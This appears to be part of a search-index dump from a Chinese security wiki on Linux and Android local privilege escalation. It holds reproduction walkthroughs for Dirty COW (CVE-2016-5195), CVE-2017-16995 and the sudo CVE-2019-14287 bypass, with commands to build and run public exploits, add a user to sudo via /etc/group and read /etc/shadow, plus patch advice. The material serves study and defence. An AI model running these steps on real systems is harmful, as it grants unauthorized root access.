\u590d\u73b0\u8fc7\u7a0b\uff1a \u7528\u7684EXP\u662f\u6d4b\u8bd5Android 6.0.1\u65f6\u7f16\u8bd1\u597d\u7684\uff0c\u62ff\u6765\u76f4\u63a5\u7528\u5373\u53ef\u3002 \u5728/system/bin\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6 test_dirty\uff0c\u8bd5\u4e86\u51e0\u6b21\u6ca1\u6709\u6210\u529f\uff1a \u89e3\u51b3\u529e\u6cd5\uff1a\u6267\u884c mount -o rw,remount /system \u5e76\u5c06\u65b0\u5efa\u7684test_dirty \u6743\u9650\u4fee\u6539\u4e3a644: \u5411\u6587\u4ef6test_dirty\u4e2d\u5199\u5165 123456,\u6267\u884cEXP\uff1a /data/local/tmp/dirtycow /system/bin/test_dirty modify EXP\u6267\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5373\u53ef\u505c\u6b62\uff0c\u6b64\u65f6\u518d\u6b21\u67e5\u770b test_dirty \u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6587\u4ef6\u5185\u5bb9\u5df2\u88ab\u66f4\u6539\u4e3a modify\uff0c\u590d\u73b0\u6210\u529f\uff1a https://forum.90sec.com/t/topic/521","title":"\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#cve-2016-5195linux-md","text":"\u7f16\u8bd1\u597d\u7684EXP\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/Brucetg/DirtyCow-EXP \u8be5\u6f0f\u6d1e\u662f Linux \u5185\u6838\u7684\u5185\u5b58\u5b50\u7cfb\u7edf\u5728\u5904\u7406\u5199\u65f6\u62f7\u8d1d\uff08Copy-on-Write\uff09\u65f6\u5b58\u5728\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\uff0c \u5bfc\u81f4\u53ef\u4ee5\u7834\u574f\u79c1\u6709\u53ea\u8bfb\u5185\u5b58\u6620\u5c04\u3002\u9ed1\u5ba2\u53ef\u4ee5\u5728\u83b7\u53d6\u4f4e\u6743\u9650\u7684\u7684\u672c\u5730\u7528\u6237\u540e\uff0c\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6 \u5176\u4ed6\u53ea\u8bfb\u5185\u5b58\u6620\u5c04\u7684\u5199\u6743\u9650\uff0c\u8fdb\u4e00\u6b65\u83b7\u53d6 root \u6743\u9650\u3002","title":"\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#1linux","text":"Ubuntu 14.04 : 1\uff09\u6dfb\u52a0\u7528\u6237\uff1a sudo adduser test \u8f93\u5165\u4e24\u6b21\u5bc6\u7801\u540e\u4e00\u76f4\u56de\u8f66\u5c31\u884c\uff0c\u67e5\u770b\u5f53\u524d\u7528\u6237\u7684\u4fe1\u606f\uff0c\u7ec8\u7aef\u8f93\u5165 id\uff0c\u56de\u8f66\uff0c\u53ef\u4ee5\u770b\u5230\u5f53 \u524d\u7528\u6237\u662f\u6709 sudo \u6743\u9650\u7684\u3002 \u5207\u6362\u5230\u521a\u521a\u65b0\u5efa\u7684 test \u7528\u6237\uff0c\u540c\u6837\u8f93\u5165 id\uff0c\u67e5\u770b test \u7528\u6237\u7684\u4fe1\u606f\uff0c\u53d1\u73b0 test \u7528\u6237\u6ca1\u6709 sudo \u6743\u9650\uff0c 2\uff09\u8fd0\u884cDirtyCow\u7684exp\u8fdb\u884c\u63d0\u6743\uff1a git clone https : // github . com / dirtycow / dirtycow . github . io cd dirtycow . github . io \u7f16\u8bd1exp\uff1a gcc dirtyc0w.c -o dirtycow lpthread \u6267\u884cexp\uff1a ./dirtycow /etc/group \u201c$(sed \u2018/\\(sudo*\\)/ s/$/,test/\u2019 /etc/group)\u201d \u65b0\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\uff0c\u5207\u6362\u5230test\uff0c\u67e5\u770btest\u7528\u6237\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230test\u7528\u6237\u5df2\u7ecf\u62e5\u6709\u4e86sudo\u6743\u9650\uff0c\u6267\u884csudo su \uff0c\u8f93\u5165test\u7528\u6237\u7684\u5bc6\u7801\u540e\u5c31\u53ef\u4ee5\u5207\u6362\u5230root\u6743\u9650\uff0c\u63d0\u6743\u6210\u529f\u3002 \u6f0f\u6d1e\u6210\u56e0\uff1a Linux\u5199\u65f6\u62f7\u8d1d\u6280\u672f\uff08copy-on-write\uff09 \u5728Linux\u7cfb\u7edf\u4e2d\uff0cfork()\u4f1a\u4ea7\u751f\u4e00\u4e2a\u548c\u7236\u8fdb\u7a0b\u5b8c\u5168\u76f8\u540c\u7684\u5b50\u8fdb\u7a0b\uff0c\u4f46\u5b50\u8fdb\u7a0b\u5728\u6b64\u540e\u591a\u4f1aexec\u7cfb\u7edf\u8c03\u7528\uff0c\u51fa\u4e8e\u6548\u7387\u8003\u8651\uff0cLinux\u7cfb\u7edf\u4e2d\u5f15\u5165\u4e86\u201c\u5199\u65f6\u590d\u5236\u201d\u6280\u672f\uff0c\u4e5f\u5c31\u662f\u53ea\u6709\u8fdb\u7a0b\u7a7a\u95f4\u7684\u5404\u6bb5\u7684\u5185\u5bb9\u8981\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u624d\u4f1a\u5c06\u7236\u8fdb\u7a0b\u7684\u5185\u5bb9\u590d\u5236\u4e00\u4efd\u7ed9\u5b50\u8fdb\u7a0b\u3002","title":"1.Linux"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#2android","text":"Linux\u4e0a\u7f16\u8bd1\u597d\u7684exp\u5728Android\u5e73\u53f0\u4e0a\u4e0d\u80fd\u7528\uff0c\u4f7f\u7528NDK\u7f16\u8bd1\u4e0b\u8f7d\u597d\u7684exp\uff1a EXP\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c","title":"2.Android\uff1a"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#1-android-studiondkcmakelldb","text":"","title":"1. ANDROID STUDIO\u4e2d\u5b89\u88c5NDK\uff0c\u628aCMAKE\u548cLLDB\u4e5f\u5b89\u88c5\u4e00\u4e0b\uff1a"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#2-httpsgithubcomgooglesamplesandroid-ndk-android-studio","text":"\u5982\u679c\u5bfc\u5165\u9879\u76ee\u65f6Android studio\u597d\u50cf\u5361\u4f4f\u4e86\u4e00\u6837\uff0c\u6709\u53ef\u80fd\u662fAndroid Studio\u5728\u540e\u53f0\u6b63\u5728\u4e0b\u8f7d\u4e1c\u897f\uff0c\u6cbf\u7740\u8fd9\u4e2a\u8def\u5f84\uff1a\u9879\u76ee/gradle/wrapper\u627e\u5230\u8fd9\u4e2a\u6587\u4ef6\uff1a gradle-wrapper.properties\uff0c\u6253\u5f00\u5b83\u770b\u770b\u6700\u540e\u4e00\u884c\u7684gradle\u7248\u672c\uff0c\u82e5\u7248\u672c\u548c\u4f60\u73b0\u6709\u7684\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u53ef\u4ee5\u53bbhttp://services.gradle.org/distributions/ \u4e0a\u4e0b\u8f7d\u76f8\u5e94\u7684\u7248\u672c\uff0c\u624b\u52a8\u62f7\u8d1d\u5230\uff1a C:\\Users\\\u7528\u6237\u540d\\.gradle\\wrapper\\dists\\gradle-4.1-all\\bzyivzo6n839fup2jbap0tjew \u76ee\u5f55\u4e0b **\u6ce8\uff1a**\u8fd9\u91cc\u7684 bzyivzo6n839fup2jbap0tjew \u662f\u968f\u673a\u7684 \u5c06\u4e0b\u8f7d\u597d\u7684android-ndk\u6e90\u7801\u89e3\u538b\u5230\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u6211\u662f\u89e3\u538b\u5230\u4e86\u684c\u9762\u4e0a\uff0c\u6240\u4ee5\u5728\u6211\u4e2a\u4eba\u7684\u7684\u8ba1\u7b97\u673a\u4e0aandroid-ndk\u8def\u5f84\u5982\u4e0b\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk \u6211\u4eec\u53ea\u9700\u8981\u7528\u4e0b\u9762\u8def\u5f84\u4e2d\u7684\u76f8\u5e94\u6587\u4ef6\u5373\u53ef\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk\\hello-jni\\app\\src\\main\\ \u5728main\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6\u5939jni\uff0c\u5728jni\u6587\u4ef6\u5939\u4e2d\u65b0\u5efa\u4e24\u4e2a\u6587\u4ef6\uff1aAndroid.mk \u548cApplication.mk,\u5185\u5bb9\u5982\u4e0b\uff1a Android.mk LOCAL_PATH := $( call my-dir ) include $(CLEAR_VARS) LOCAL_SRC_FILES := dirtyc0w.c LOCAL_MODULE := dirtycow LOCAL_FORCE_STATIC_EXECUTABLE := true #LOCAL_STATIC_LIBRARIES := libc #LOCAL_CFLAGS += -Iinclude/dir -DSOMEFLAGS include $(BUILD_EXECUTABLE) Application.mk APP_ABI := all \u8981\u7f16\u8bd1\u7684\u6587\u4ef6\uff1a","title":"2. \u5728 HTTPS://GITHUB.COM/GOOGLESAMPLES/ANDROID-NDK \u4e0b\u8f7d\u6e90\u7801\uff0c\u5bfc\u5165ANDROID STUDIO"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/#3-exp","text":"\u547d\u4ee4\u884c\u4e0bcd \u5230\u5982\u4e0b\u76ee\u5f55\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk\\hello-jni\\app\\src\\main\\jni \u6267\u884c\u547d\u4ee4\uff1a D:\\AndroidSDK\\ndk-bundle\\ndk-build \u7f16\u8bd1\u6210\u529f\u540e,\u5728main\u76ee\u5f55\u4e0b\u7684libs\u6587\u4ef6\u5939\u4e2d\u5373\u53ef\u627e\u5230\u7f16\u8bd1\u597d\u7684\u5bf9\u5e94\u5e73\u53f0\u7684EXP\uff1a \u7f16\u8bd1\u597d\u7684exp\uff1a Android 4.4 adb\u8fde\u63a5\u624b\u673a\uff08\u624b\u673a\u9700\u5f00\u542fUSB\u8c03\u8bd5\uff09\uff1a \u67e5\u770b\u548cadb\u8fde\u63a5\u7684\u8bbe\u5907\uff1a \u5728/system/bin/\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6test_dirty_cow\uff0c\u5e76\u4e14\u5c06\u5176\u6743\u9650\u4fee\u6539\u4e3a644 \u5c06\u7f16\u8bd1\u597d\u7684EXP push\u5230\u6d4b\u8bd5\u673a\u7684/data/local/tmp/\u76ee\u5f55\u4e0b\u7684dirtycow\u6587\u4ef6\u4e2d\uff08\u8fd9\u91cc\u9009\u7528\u7684\u7f16\u8bd1\u597d\u7684POC\u662farmeabi \u5e73\u53f0\u7684\uff0carm64-v8a\u7ecf\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7528\u7684\u6d4b\u8bd5\u673a\u7684\u67b6\u6784\u9009\u62e9\u76f8\u5e94\u7684\u5e73\u53f0\uff09\uff1a \u4fee\u6539EXP\u6743\u9650\uff1a \u5f53\u524d\u7528\u6237\u6743\u9650\uff08shell\uff09\uff1a \u5207\u6362\u5230root\u6743\u9650\uff0c\u5411test_dirty_cow\u6587\u4ef6\u4e2d\u5199\u5165 123456\uff0c\u5199\u5165\u4e4b\u540e\u518d\u5207\u6362\u4e3a\u666e\u901a\u7528\u6237\u6743\u9650\uff08shell\uff09\uff0c\u4ee5\u666e\u901a\u7528\u6237\u6743\u9650\u6267\u884cEXP\uff08\u4e0b\u540c\uff09\uff1a /data/local/tmp/dirtycow /system/bin/test_dirty_cow modify \u7136\u540e\u67e5\u770btest_dirty_cow\u4e2d\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6587\u4ef6\u5185\u5bb9\u5df2\u88ab\u4fee\u6539\u4e3amodify\uff0c\u590d\u73b0\u6210\u529f\uff1a Android 6.0.1 \uff08\u5b89\u5168\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\uff1a 2017\u5e742\u67081\u65e5\uff09 \u6d4b\u8bd5\u673a\u7cfb\u7edf\u5177\u4f53\u4fe1\u606f\uff1a Android 6.0.1 \u9ed8\u8ba4\u5173\u95ed\u4e86\u5e76\u9690\u85cf\u4e86\u5f00\u53d1\u8005\u9009\u9879\uff0c\u9700\u8981\u5728\u5173\u4e8e\u624b\u673a\u91cc\u7684\u7248\u672c\u53f7\u5904\u8fde\u7eed\u70b9\u51fb5\u6b21\u7248\u672c\u53f7\u624d\u53ef\u4ee5\u542f\u7528\u5f00\u53d1\u8005\u9009\u9879\uff0c\u7136\u540e\u5728\u5f00\u53d1\u8005\u9009\u9879\u4e2d\u542f\u7528USB\u8c03\u8bd5\u3002 \u63a5\u7740\u6211\u4eec\u5728 /system/bin \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7528\u6237\u6ca1\u6709\u5199\u6743\u9650\u7684\u6587\u4ef6\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684 /system \u76ee\u5f55\u662f\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u9700\u8981 remount /system \u6ce8\u610f\uff1a mount -o rw,remount /system \u4e0a\u8ff0\u547d\u4ee4\u4e2d\uff0cremount\u548c\u5b83\u524d\u9762\u7684\u9017\u53f7\u4e4b\u95f4\u4e0d\u8981\u6709\u7a7a\u683c\u3002 \u63a5\u4e0b\u6765\u7684\u64cd\u4f5c\u6b65\u9aa4\u548c\u5728Android 4.4 \u7cfb\u7edf\u4e2d\u5dee\u4e0d\u591a\uff1a adb\u4e2d\u5207\u6362\u4e3aroot\u6743\u9650\uff0c\u5c06\u65b0\u5efa\u7684test_dirtycow \u6587\u4ef6\u7684\u6743\u9650\u4fee\u6539\u4e3a 644 \u7ed9EXP\u53ef\u6267\u884c\u6743\u9650\uff1a \u6267\u884cEXP \u62a5\u9519\uff1a PIE\u8fd9\u4e2a\u5b89\u5168\u673a\u5236\u4ece4.1\u5f15\u5165\uff0c\u4f46\u662fAndroid L\u4e4b\u524d\u7684\u7cfb\u7edf\u7248\u672c\u5e76\u4e0d\u4f1a\u53bb\u68c0\u9a8c\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u57fa\u4e8ePIE\u7f16\u8bd1\u51fa\u7684\u3002\u56e0\u6b64\u4e0d\u4f1a\u62a5\u9519\u3002\u4f46\u662fAndroid L\u5df2\u7ecf\u5f00\u542f\u9a8c\u8bc1\uff0c\u5982\u679c\u8c03\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0d\u662f\u57fa\u4e8ePIE\u65b9\u5f0f\u7f16\u8bd1\u7684\uff0c\u5219\u65e0\u6cd5\u8fd0\u884c\u3002\u89e3\u51b3\u529e\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u5728Android.mk\u4e2d\u52a0\u5165\u5982\u4e0bflag\u5373\u53ef\u3002 LOCAL_CFLAGS += -pie -fPIE LOCAL_LDFLAGS += -pie -fPIE \u4fee\u6539\u540e\u7684Android.mk \u6587\u4ef6\uff1a LOCAL_PATH := $( call my-dir ) include $(CLEAR_VARS) LOCAL_SRC_FILES := dirtyc0w.c LOCAL_MODULE := dirtycow LOCAL_FORCE_STATIC_EXECUTABLE := true #LOCAL_STATIC_LIBRARIES := libc #LOCAL_CFLAGS += -Iinclude/dir -DSOMEFLAGS LOCAL_CFLAGS += -pie -fPIE LOCAL_LDFLAGS += -pie -fPIE include $(BUILD_EXECUTABLE) Application.mk APP_ABI := all \u7f16\u8bd1EXP\uff1a Windows\u547d\u4ee4\u884c\u4e0b\u8fdb\u884c\u7f16\u8bd1\uff0c\u56e0\u4e3a\u6211\u4e0b\u8f7d\u7684ndk \u5b58\u653e\u5728D:\\AndroidSDK\\ndk-bundle\u6587\u4ef6\u5939\u4e2d\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u547d\u4ee4\u884c\u4e0b\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a D:\\AndroidSDK\\ndk-bundle\\ndk-build \u7ecf\u6d4b\u8bd5\uff0c\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\u6587\u4ef6\u5185\u5bb9\uff1a \u56e0\u4e3a\u8fd9\u4e2aAndroid 6.0\u7684\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u662f2017\u5e742\u6708\u4efd\u7684\uff0c\u4f30\u8ba1\u6f0f\u6d1e\u5df2\u7ecf\u4fee\u8865\u597d\u4e86\u3002 Android 6.0.1_r68\uff08\u5b89\u5168\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\uff1a 2016\u5e749\u67086\u65e5\uff09 \u4e0d\u591a\u8bf4\uff0c\u4e00\u6837\u7684\u64cd\u4f5c\uff1a \u53ef\u4ee5\u770b\u5230test_dirtyc0w\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u88ab\u4fee\u6539\u4e3a modify\uff0c\u590d\u73b0\u6210\u529f\u3002 Android 5.1.1 \u590d\u73b0\u8fc7\u7a0b\uff1a \u7528\u7684EXP\u662f\u6d4b\u8bd5Android 6.0.1\u65f6\u7f16\u8bd1\u597d\u7684\uff0c\u62ff\u6765\u76f4\u63a5\u7528\u5373\u53ef\u3002 \u5728/system/bin\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6 test_dirty\uff0c\u8bd5\u4e86\u51e0\u6b21\u6ca1\u6709\u6210\u529f\uff1a \u89e3\u51b3\u529e\u6cd5\uff1a\u6267\u884c mount -o rw,remount /system \u5e76\u5c06\u65b0\u5efa\u7684test_dirty \u6743\u9650\u4fee\u6539\u4e3a644: \u5411\u6587\u4ef6test_dirty\u4e2d\u5199\u5165 123456,\u6267\u884cEXP\uff1a /data/local/tmp/dirtycow /system/bin/test_dirty modify EXP\u6267\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5373\u53ef\u505c\u6b62\uff0c\u6b64\u65f6\u518d\u6b21\u67e5\u770b test_dirty \u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6587\u4ef6\u5185\u5bb9\u5df2\u88ab\u66f4\u6539\u4e3a modify\uff0c\u590d\u73b0\u6210\u529f\uff1a https://forum.90sec.com/t/topic/521","title":"3. \u7f16\u8bd1EXP\uff1a"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743/","text":"\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743 CVE-2017-16995 Vulnerability reference: CVE-2017-16995 Kernels Linux Kernel Version 4.14-4.4 Usage $ gcc -o pwned upstream44.c $ ./pwned References http://cyseclabs.com/exploits/upstream44.c https://access.redhat.com/security/cve/cve-2017-16995 https://bugs.chromium.org/p/project-zero/issues/detail?id=1454 desc=3 http://www.freebuf.com/news/165608.html https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995","title":"\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743/#cve-2017-16995ubuntu","text":"CVE-2017-16995 Vulnerability reference: CVE-2017-16995","title":"\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743/#kernels","text":"Linux Kernel Version 4.14-4.4","title":"Kernels"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743/#usage","text":"$ gcc -o pwned upstream44.c $ ./pwned","title":"Usage"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2017-16995\uff09Ubuntu \u5185\u6838\u63d0\u6743/#references","text":"http://cyseclabs.com/exploits/upstream44.c https://access.redhat.com/security/cve/cve-2017-16995 https://bugs.chromium.org/p/project-zero/issues/detail?id=1454 desc=3 http://www.freebuf.com/news/165608.html https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995","title":"References"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-14287\uff09sudo\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2019-14287\uff09sudo\u63d0\u6743\u6f0f\u6d1e *\u5b9e\u9a8c\u73af\u5883\uff1a* kali *\u5f71\u54cd\u8303\u56f4\uff1a* sudo 1.8.28 \u4e4b\u524d\u7684\u6240\u6709\u7248\u672c *\u590d\u73b0\u8fc7\u7a0b* \u67e5\u8be2\u4e0bsudo\u7684\u7248\u672c sudo -V \u521b\u5efa\u7528\u6237 useradd testpasswd test \u7f16\u8f91\u4e0bsudoers\u6587\u4ef6 \u8fd9\u91cc\u6dfb\u52a0\u4e86 test ALL=(ALL, !root) /usr/bin/vim \u8fd9\u91cc\u8868\u793a test \u53ef\u4ee5 \u4efb\u610f\u4e3b\u673a\u4e0a \u4efb\u4f55\u7528\u6237 \u4f46\u8fd9\u4e2a\u7528\u6237\u4e0d\u80fd\u5c5e\u4e8eroot\u7ec4 \u6267\u884cvim\u547d\u4ee4 \u8fd9\u91cc\u4ecb\u7ecd\u4e0b\u5b57\u6bb5\u542b\u4e49: \u6388\u6743\u7528\u6237/\u7ec4 \u4e3b\u673a=[(\u5207\u6362\u5230\u54ea\u4e9b\u7528\u6237\u6216\u7ec4)][\u662f\u5426\u9700\u8981\u8f93\u5165\u5bc6\u7801\u9a8c\u8bc1] \u547d\u4ee41,\u547d\u4ee42 *\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u6388\u6743\u7528\u6237/\u7ec4 \u4e0d\u4ee5%\u5f00\u5934\u7684\uff0c\u4ee3\u8868\u201c\u5c06\u8981\u6388\u6743\u7684\u7528\u6237\u201d \u4ee5%\u5f00\u5934\u7684\u8868\u793a\u201c\u5c06\u8981\u6388\u6743\u7684\u7ec4\u201d *\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u5141\u8bb8\u767b\u5f55\u7684\u4e3b\u673a *\u7b2c\u4e09\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u53ef\u4ee5\u5207\u6362\u5230\u7684\u7528\u6237\u6216\u8005\u7ec4\uff0c\u7701\u7565\u8868\u793a\u5207\u6362\u5230root\u3002 \u5982\u679c\u4e0d\u7701\u7565\u9700\u8981\u7528\u62ec\u53f7\u8868\u793a (\u7528\u6237:\u7ec4) *\u7b2c\u56db\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u82e5\u6dfb\u52a0NOPASSWD\u8868\u793a\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u5982\u679c\u7701\u7565\u5219\u8868\u793a\u9700\u8981\u8f93\u5165\u5bc6\u7801 *\u7b2c\u4e94\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u53ef\u4ee5\u8fd0\u884c\u7684\u547d\u4ee4 \u6211\u4eec\u7528test\u7528\u6237\u767b\u5f55\u4e0bKali\uff0c\u5e76\u5c1d\u8bd5\u8bfb\u53d6shadow\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u8f93\u5165 sudo -u#-1 vim\u6216\u8005sudo -u#4294967295 vim \u8fdb\u5165\u5230vim \u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\u5c1d\u8bd5\u8bfb\u53d6/etc/shadow\u6587\u4ef6 \u6210\u529f\u8bfb\u53d6\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u7528vim\u6267\u884c\u5176\u4ed6\u7684\u547d\u4ee4\uff08\u4ee5root\u8eab\u4efd\uff09 *\u603b\u7ed3OR\u9884\u9632\uff1a* 1.\u4e4b\u6240\u4ee5\u4f1a\u4ea7\u751f\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u662f\u56e0\u4e3a\u5c06\u7528\u6237 ID \u8f6c\u6362\u4e3a\u7528\u6237\u540d\u7684\u51fd\u6570\u4f1a\u5c06 -1\uff08\u6216\u65e0\u6548\u7b49\u6548\u7684 4294967295\uff09\u8bef\u8ba4\u4e3a\u662f 0\uff0c\u800c\u8fd9\u6b63\u597d\u662f root \u7528\u6237 User ID 2.\u8bf7\u5c06 sudo \u5347\u7ea7\u5230 1.8.28 \u6700\u65b0\u7248\u672c\uff0c\u8be5\u6f0f\u6d1e\u4f1a\u5f71\u54cd 1.8.28 \u4e4b\u524d\u7684\u6240\u6709\u7248\u672c\u3002","title":"\uff08CVE-2019-14287\uff09sudo\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-14287\uff09sudo\u63d0\u6743\u6f0f\u6d1e/#cve-2019-14287sudo","text":"*\u5b9e\u9a8c\u73af\u5883\uff1a* kali *\u5f71\u54cd\u8303\u56f4\uff1a* sudo 1.8.28 \u4e4b\u524d\u7684\u6240\u6709\u7248\u672c *\u590d\u73b0\u8fc7\u7a0b* \u67e5\u8be2\u4e0bsudo\u7684\u7248\u672c sudo -V \u521b\u5efa\u7528\u6237 useradd testpasswd test \u7f16\u8f91\u4e0bsudoers\u6587\u4ef6 \u8fd9\u91cc\u6dfb\u52a0\u4e86 test ALL=(ALL, !root) /usr/bin/vim \u8fd9\u91cc\u8868\u793a test \u53ef\u4ee5 \u4efb\u610f\u4e3b\u673a\u4e0a \u4efb\u4f55\u7528\u6237 \u4f46\u8fd9\u4e2a\u7528\u6237\u4e0d\u80fd\u5c5e\u4e8eroot\u7ec4 \u6267\u884cvim\u547d\u4ee4 \u8fd9\u91cc\u4ecb\u7ecd\u4e0b\u5b57\u6bb5\u542b\u4e49: \u6388\u6743\u7528\u6237/\u7ec4 \u4e3b\u673a=[(\u5207\u6362\u5230\u54ea\u4e9b\u7528\u6237\u6216\u7ec4)][\u662f\u5426\u9700\u8981\u8f93\u5165\u5bc6\u7801\u9a8c\u8bc1] \u547d\u4ee41,\u547d\u4ee42 *\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u6388\u6743\u7528\u6237/\u7ec4 \u4e0d\u4ee5%\u5f00\u5934\u7684\uff0c\u4ee3\u8868\u201c\u5c06\u8981\u6388\u6743\u7684\u7528\u6237\u201d \u4ee5%\u5f00\u5934\u7684\u8868\u793a\u201c\u5c06\u8981\u6388\u6743\u7684\u7ec4\u201d *\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u5141\u8bb8\u767b\u5f55\u7684\u4e3b\u673a *\u7b2c\u4e09\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u53ef\u4ee5\u5207\u6362\u5230\u7684\u7528\u6237\u6216\u8005\u7ec4\uff0c\u7701\u7565\u8868\u793a\u5207\u6362\u5230root\u3002 \u5982\u679c\u4e0d\u7701\u7565\u9700\u8981\u7528\u62ec\u53f7\u8868\u793a (\u7528\u6237:\u7ec4) *\u7b2c\u56db\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u82e5\u6dfb\u52a0NOPASSWD\u8868\u793a\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u5982\u679c\u7701\u7565\u5219\u8868\u793a\u9700\u8981\u8f93\u5165\u5bc6\u7801 *\u7b2c\u4e94\u4e2a\u5b57\u6bb5\u8868\u793a\uff1a* \u53ef\u4ee5\u8fd0\u884c\u7684\u547d\u4ee4 \u6211\u4eec\u7528test\u7528\u6237\u767b\u5f55\u4e0bKali\uff0c\u5e76\u5c1d\u8bd5\u8bfb\u53d6shadow\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u8f93\u5165 sudo -u#-1 vim\u6216\u8005sudo -u#4294967295 vim \u8fdb\u5165\u5230vim \u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\u5c1d\u8bd5\u8bfb\u53d6/etc/shadow\u6587\u4ef6 